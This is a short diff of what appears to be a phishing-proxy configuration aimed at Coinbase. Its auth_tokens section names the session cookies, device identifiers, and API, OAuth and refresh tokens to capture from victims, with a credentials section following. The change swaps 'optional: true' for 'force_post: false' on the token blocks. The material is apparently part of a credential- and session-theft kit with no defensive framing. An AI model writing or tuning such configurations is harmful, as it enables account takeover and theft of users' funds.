@@ -28,18 +28,19 @@ auth_tokens:
   - domain: '.coinbase.com'
     keys: ['__cf_bm', '_coinbase_session', 'cb_dm', 'cb_ls', 'device_id', 'country_code']
     type: 'cookie'
+    force_post: false
   
   # Session and tracking cookies
   - domain: '.coinbase.com'
     keys: ['_ga', '_gid', '_gat', 'analytics_session', 'optimizelyEndUserId']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # API and OAuth tokens
   - domain: '.coinbase.com'
     keys: ['api_key', 'oauth_token', 'refresh_token']
     type: 'cookie'
-    optional: true
+    force_post: false
 
 credentials:
   username:
